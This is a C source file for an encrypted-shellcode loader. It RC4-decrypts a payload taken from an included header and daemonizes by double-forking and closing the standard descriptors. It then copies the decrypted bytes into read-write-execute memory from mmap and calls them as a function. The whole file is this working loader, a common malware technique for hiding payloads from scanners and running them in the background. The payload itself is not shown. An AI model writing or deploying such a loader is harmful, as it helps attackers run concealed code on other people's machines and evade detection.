#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <signal.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <fcntl.h>
#include <sys/mman.h>
#include "encrypted_payload.h"

// RC4 encryption/decryption function
void rc4_crypt(unsigned char *data, int data_len, unsigned char *key, int key_len) {
    unsigned char S[256];
    unsigned char T[256];
    int i, j = 0, k;
    unsigned char tmp;

    for (i = 0; i < 256; i++) {
        S[i] = i;
        T[i] = key[i % key_len];
    }

    for (i = 0; i < 256; i++) {
        j = (j + S[i] + T[i]) % 256;
        tmp = S[i];
        S[i] = S[j];
        S[j] = tmp;
    }

    i = j = 0;
    for (k = 0; k < data_len; k++) {
        i = (i + 1) % 256;
        j = (j + S[i]) % 256;
        tmp = S[i];
        S[i] = S[j];
        S[j] = tmp;
        data[k] ^= S[(S[i] + S[j]) % 256];
    }
}

// Function to create a daemon
void create_daemon() {
    pid_t pid, sid;

    // Fork off the parent process
    pid = fork();
    if (pid < 0) {
        exit(EXIT_FAILURE);
    }
    // If we got a good PID, then we can exit the parent process.
    if (pid > 0) {
        exit(EXIT_SUCCESS);
    }

    // Change the file mode mask
    umask(0);

    // Open any logs here

    // Create a new SID for the child process
    sid = setsid();
    if (sid < 0) {
        // Log the failure
        exit(EXIT_FAILURE);
    }

    // Fork again to ensure the daemon cannot acquire a controlling terminal
    pid = fork();
    if (pid < 0) {
        exit(EXIT_FAILURE);
    }
    if (pid > 0) {
        exit(EXIT_SUCCESS);
    }

    // Change the current working directory
    if ((chdir("/")) < 0) {
        // Log the failure
        exit(EXIT_FAILURE);
    }

    // Close out the standard file descriptors
    close(STDIN_FILENO);
    close(STDOUT_FILENO);
    close(STDERR_FILENO);

    // Open the log file
    //openlog("mydaemon", LOG_PID, LOG_DAEMON);
}

int main() {
    // Create the daemon
    create_daemon();

    // Decrypt the payload
    rc4_crypt(buf, BUF_SIZE, key, sizeof(key) - 1);

    // Allocate executable memory
    void *exec = mmap(NULL, BUF_SIZE, PROT_READ | PROT_WRITE | PROT_EXEC, MAP_ANONYMOUS | MAP_PRIVATE, -1, 0);
    if (exec == MAP_FAILED) {
        perror("mmap");
        exit(EXIT_FAILURE);
    }

    // Copy the decrypted payload to the executable memory
    memcpy(exec, buf, BUF_SIZE);

    // Create a function pointer to the shellcode
    void (*shellcode)() = exec;

    // Execute the shellcode
    shellcode();

    return 0;
}
